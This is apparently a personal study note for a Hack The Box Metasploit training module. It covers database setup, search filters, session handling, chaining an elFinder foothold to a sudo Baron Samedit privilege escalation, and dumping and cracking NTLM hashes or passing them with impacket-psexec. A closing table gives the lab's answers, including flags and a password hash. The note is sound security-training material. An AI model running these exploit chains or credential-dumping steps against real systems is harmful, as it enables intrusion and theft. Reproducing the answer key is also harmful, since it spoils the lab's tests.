# Using the Metasploit Framework (HTB Supplementary)

#Metasploit #msfconsole #Meterpreter #msfdb #dbNmap #SessionManagement #PostExploitation #Hashdump #SearchFilters #EternalRomance #BaronSamedit #elFinder #FortiLogger #ApacheDruid #HTBSupplementary

**HTB Using the Metasploit Framework module** — no dedicated Offsec MSF module note exists in this vault yet (Offsec PEN-200 covers MSF throughout many modules but doesn't consolidate it). This note covers all the MSF-specific mechanics the HTB module introduces as a coherent reference: database setup, search filter syntax, session management, local exploit chaining, and post-exploitation hashdump.

> 🔁 Cross-refs: [[Shells & Payloads (HTB Supplementary)#SP.4. Automating Payloads with Metasploit|SP.4 MSF psexec]], [[Shells & Payloads (HTB Supplementary)#SP.5. Infiltrating Windows|SP.5 ms17_010_psexec + EternalBlue]], [[Shells & Payloads]] (Command Appendix, multi/handler section), [[Password Attacks]] (secretsdump, hash cracking), [[Vulnerability Scanning#7.2.4. Analyzing the Results|7.2.4 MS17-010 in Nessus]]

---

## MSF.1. MSF Database Setup

Metasploit can store scan results, credentials, and session data in a PostgreSQL database. When the DB is connected, `db_nmap` runs Nmap and automatically saves hosts and services into the database for later querying.

**Launch msfconsole with DB:**
```bash
sudo msfdb run
# Starts PostgreSQL if not already running, then launches msfconsole
# You should see: "[i] Database already started" or "[+] Starting database"
```

Without `sudo msfdb run`, the database won't connect. Use plain `msfconsole -q` if you don't need DB features.

**Verify DB is connected:**
```
msf6 > db_status
# Should show: [*] Connected to msf. Connection type: postgresql.
# If it shows "No active database.", run: sudo msfdb init
```

**Run Nmap from within msfconsole and store results:**
```bash
db_nmap -A --top-ports 60 -T5 TARGET_IP

# Exact same flags as regular Nmap — all results go into the MSF DB
# After scanning, query results with:
hosts           # list discovered hosts
services        # list discovered services
vulns           # list discovered vulnerabilities
```

**Useful DB query commands:**
```
hosts -c address,os_name,os_sp     # show address + OS info for all hosts
services -p 445                     # show all hosts with port 445 open
services -s http                    # show all HTTP services
creds                               # list stored credentials
```

> 🔍 Worth remembering generally: `db_nmap` doesn't require any special syntax changes over regular Nmap — every flag you know works identically. The only difference is the results land in the database instead of just stdout. When working a multi-host network, storing results in the DB makes it easy to reference discovered services later without re-running scans.

> 🔧 Technique: if `db_nmap` returns "No database connected", restart with `sudo msfdb run` instead of plain `msfconsole`. Once disconnected, you can't reconnect mid-session without restarting.

#### Tags: #msfdb #dbNmap #Database #PostgreSQL #Recon

---

## MSF.2. Search Filter Syntax

The `search` command in msfconsole supports keyword filters that narrow results significantly. The syntax is `filter:value` appended to the keyword.

**Available filters:**

| Filter | Example | Effect |
|--------|---------|--------|
| `cve:` | `search cve:2021` | CVE disclosure year |
| `name:` | `search name:sudo` | Module name contains |
| `platform:` | `search platform:windows` | Target OS |
| `type:` | `search type:exploit` | Module type (exploit/auxiliary/post) |
| `rank:` | `search rank:excellent` | Module rank |

**Examples from the module:**
```bash
search eternalromance                   # keyword search
search CVE-2021-3156                    # exact CVE lookup
search sudo baron samedit               # multi-word keyword
search sudo cve:2021                    # sudo modules with CVE year 2021
search hashdump post windows            # multi-keyword refinement
search type:exploit platform:linux sudo # fully filtered search
```

**Multi-keyword searches** don't need commas — just space-separate terms and MSF ranks results by relevance.

**setg vs set:**
```bash
set LHOST tun0    # sets LHOST for the current module only
setg LHOST tun0   # sets LHOST globally — persists when you switch modules
```
`setg` is useful when you know LHOST won't change throughout a session. You'd still need `set RHOSTS TARGET` per module since the target changes.

> 🔧 Technique: use `unsetg LHOST` to clear a global option if it starts causing problems. Global options aren't obvious from `show options` — `show global` reveals them.

> 🔍 Worth remembering generally: if you know the CVE ID, `search CVE-XXXX-YYYY` almost always returns the right module directly, no guessing needed. If you only know the year, `search appname cve:2021` narrows it to only that year's disclosures, which is much faster than scrolling through a long list.

#### Tags: #SearchFilters #cve #setg #ModuleSelection

---

## MSF.3. Session Management and Local Exploit Chaining

Once you have a Meterpreter session, you'll often need to background it and run a second module (a local privilege escalation) on the same session.

**Background a session:**
```
meterpreter > background
# Returns to the msf6 > prompt
# Session stays alive in the background
```

**List active sessions:**
```
msf6 > sessions
# Shows session ID, type, info, connection addresses
```

**Re-interact with a session:**
```
msf6 > sessions -i 1
# -i = interact with session ID 1
```

**Kill a session:**
```
msf6 > sessions -k 1
```

**Chain a local exploit using SESSION:**
Some exploits (local privilege escalation modules) don't open a new listener — instead they run through an existing session you already have. These require a `SESSION` option:
```bash
use exploit/linux/local/sudo_baron_samedit

set SESSION 1        # the existing session ID from your initial foothold
set LHOST tun0       # where the NEW meterpreter shell calls back to
set LPORT 9001       # MUST change if 4444 is already in use by the original handler
run
```

> 🔧 Technique: the warning `[!] SESSION may not be compatible with this module: * incompatible session architecture: x86` usually doesn't prevent the exploit from working. The module will try the target anyway and often succeeds. Let it run before concluding the architecture mismatch is fatal.

**LPORT conflict — when port 4444 is already in use:**
If you have an existing Meterpreter handler running on 4444, a second `exploit` command will fail to start a new handler on the same port. Always change LPORT for the second module:
```bash
set LPORT 9001       # or any free port
# The original session on 4444 is unaffected
```

> 🔍 Worth remembering generally: backgrounding doesn't kill a session — the Meterpreter channel stays open. A session only dies if the target process is killed, you run `sessions -k ID`, or the network connection drops. You can have dozens of backgrounded sessions and interact with each at will.

**Full chaining workflow (elFinder → Baron Samedit from the module):**
```bash
# Step 1: Foothold with elFinder
use exploit/linux/http/elfinder_archive_cmd_injection
set LHOST tun0
set RHOSTS TARGET_IP
exploit
# → meterpreter session 1

# Step 2: Check sudo version from the shell
shell
sudo -V                  # → Sudo version 1.8.31
exit                     # back to meterpreter

# Step 3: Background session and search for privesc
background
search sudo cve:2021     # → sudo_baron_samedit

# Step 4: Use local exploit with SESSION
use exploit/linux/local/sudo_baron_samedit
set SESSION 1
set LHOST tun0
set LPORT 9001           # changed to avoid port conflict with session 1's handler
run
# → meterpreter session 2 (as root)
```

#### Tags: #SessionManagement #background #LocalExploit #SessionOption #LPORTConflict #PrivEsc

---

## MSF.4. Post-Exploitation: NTLM Hash Dumping

After getting a Meterpreter session on a Windows target as SYSTEM (or a high-privilege user), you can dump local password hashes using the `post/windows/gather/hashdump` module.

```bash
# Background the Meterpreter session first
background

# Search for the right module
search hashdump post windows

# Use the Windows local hashdump
use post/windows/gather/hashdump

# Set SESSION to the existing Meterpreter session ID
set SESSION 1
run
```

**Example output:**
```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:bdaffbfe64f1fc646a3353be1c2c3c99:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb-student:1002:aad3b435b51404eeaad3b435b51404ee:cf3a5525ee9414229e66279623ed5c58:::
```

**Hash format:** `Username:RID:LM_hash:NT_hash:::`

- **LM hash** (3rd field): `aad3b435b51404eeaad3b435b51404ee` is the empty LM hash — means LM auth is disabled (standard on modern Windows). Effectively useless for cracking.
- **NT hash** (4th field): the actual NTLM hash. This is what you crack with hashcat or use for pass-the-hash.

**Extract just the NT hash from a specific user:**
```bash
# From the module output, the NT hash for htb-student is:
cf3a5525ee9414229e66279623ed5c58
# (the 4th colon-separated field)
```

**Crack it with hashcat:**
```bash
hashcat -m 1000 cf3a5525ee9414229e66279623ed5c58 /usr/share/wordlists/rockyou.txt
# -m 1000 = NTLM
```

**Pass-the-hash instead of cracking:**
```bash
impacket-psexec Administrator@TARGET_IP -hashes :bdaffbfe64f1fc646a3353be1c2c3c99
# Format is LM_hash:NT_hash — for modern Windows, use :NT_hash (empty LM)
```

**Alternative: smart_hashdump** — dumps domain controller hashes too if the target is a DC:
```bash
use post/windows/gather/smart_hashdump
set SESSION 1
run
```

> 🔧 Technique: `post/windows/gather/hashdump` requires SYSTEM privileges to read the SAM. If you have a Meterpreter as a local admin but not SYSTEM, use `getsystem` first to elevate within Meterpreter: `meterpreter > getsystem`.

> 🔁 Similar to: [[Password Attacks]] uses `impacket-secretsdump` / `crackmapexec --sam` for the same result without MSF. The MSF post module is convenient when you already have a Meterpreter session and don't want to drop additional tools on disk.

#### Tags: #Hashdump #NTLM #postExploit #Windows #SAM #PassTheHash #hashcat

---

## MSF.5. Named Exploits Reference

New exploits introduced in this module (not covered elsewhere in the vault):

| Module path | Target / Vulnerability | Notes |
|---|---|---|
| `exploit/linux/http/apache_druid_js_rce` | Apache Druid 0.20.0 — JavaScript RCE | RHOSTS + LHOST only; payload: linux/x64/meterpreter/reverse_tcp |
| `exploit/linux/http/elfinder_archive_cmd_injection` | elFinder 2.1.53 — archive command injection | RHOSTS + LHOST; creates/deletes temp files during exploitation |
| `exploit/linux/local/sudo_baron_samedit` | sudo 1.8.31 — heap buffer overflow (CVE-2021-3156) | Requires SESSION (existing shell); use LPORT ≠ 4444 if primary handler on 4444 |
| `exploit/windows/http/fortilogger_arbitrary_fileupload` | FortiLogger 4.4.2.2 — arbitrary file upload | RHOSTS + LHOST; IIS 10.0 on port 5000 in the lab |

**sudo_baron_samedit (CVE-2021-3156) background:** discovered January 2021, dubbed "Baron Samedit". Affects sudo 1.6.8 through 1.9.3p1 (all builds before 1.9.5p2). The vulnerability is a heap-based buffer overflow in sudo's argument parsing, exploitable by any local user without needing any sudo privileges. Gives root.

**elFinder background:** PHP-based file manager for web servers. CVE-2021-23925 (archive injection). The module uploads a text file, creates a zip archive with a crafted name to trigger command injection, and uses the stager to deliver Meterpreter.

> 🔁 Similar to: `exploit/windows/smb/ms17_010_psexec` (EternalRomance) — already documented in [[Shells & Payloads (HTB Supplementary)#SP.5. Infiltrating Windows|SP.5]] — is also searched in this module but cross-referenced rather than repeated here.

#### Tags: #NamedExploits #ApacheDruid #elFinder #BaronSamedit #CVE20213156 #FortiLogger

---

## MSF.6. All Section Q&A Answers

| Section | Q | Answer |
|---|---|---|
| Introduction to Metasploit | Commercial version name? | **Metasploit Pro** |
| Introduction to Metasploit | Open-source console interface? | **msfconsole** |
| Modules | EternalRomance flag on Administrator Desktop? | **HTB{MSF-W1nD0w5-3xPL01t4t10n}** |
| Payloads | Apache Druid flag at /root/flag.txt? | **HTB{MSF_Expl01t4t10n}** |
| Sessions & Jobs | Web app visible in HTML source? | **elFinder** |
| Sessions & Jobs | Username after elFinder shell? | **www-data** |
| Sessions & Jobs | Flag at /root/flag.txt (after Baron Samedit)? | **HTB{5e55ion5_4r3_sw33t}** |
| Meterpreter | Username from FortiLogger shell? | **nt authority\system** |
| Meterpreter | NTLM hash for htb-student? | **cf3a5525ee9414229e66279623ed5c58** |

---

## Outstanding Sections

- [x] MSF.1. Database setup (msfdb run, db_nmap, hosts/services/vulns)
- [x] MSF.2. Search filter syntax (cve:, platform:, type:, setg vs set)
- [x] MSF.3. Session management (background, SESSION chaining, LPORT conflict)
- [x] MSF.4. Post-exploitation hashdump (hash format, crack or PTH)
- [x] MSF.5. Named exploits reference (apache_druid, elfinder, baron_samedit, fortilogger)
- [x] MSF.6. All Q&A answers
- All hands-on labs are HTB spawnable targets only — no Offsec VM required

---

## Related Boxes

- **[Blue](https://0xdf.gitlab.io/2021/05/11/htb-blue.html)** (HTB, Windows, Easy): MS17-010 EternalBlue / EternalRomance. Direct hands-on for the Modules Q1 exploit chain.
- **[Bashed](https://0xdf.gitlab.io/2018/04/29/htb-bashed.html)** (HTB, Linux, Easy): web shell → low-priv shell → sudo escalation. Similar structure to the Sessions & Jobs elFinder → Baron Samedit chain.
- **[Shocker](https://0xdf.gitlab.io/2018/09/21/htb-shocker.html)** (HTB, Linux, Easy): Shellshock web RCE → sudo GTFOBin escalation. Another example of web exploit foothold + local privesc chaining, same workflow pattern as MSF.3.
- **[Jerry](https://0xdf.gitlab.io/2019/02/21/htb-jerry.html)** (HTB, Windows, Easy): Tomcat Manager WAR file → SYSTEM. Landing `nt authority\system` directly from a web exploit, same outcome as Meterpreter Q1 FortiLogger.
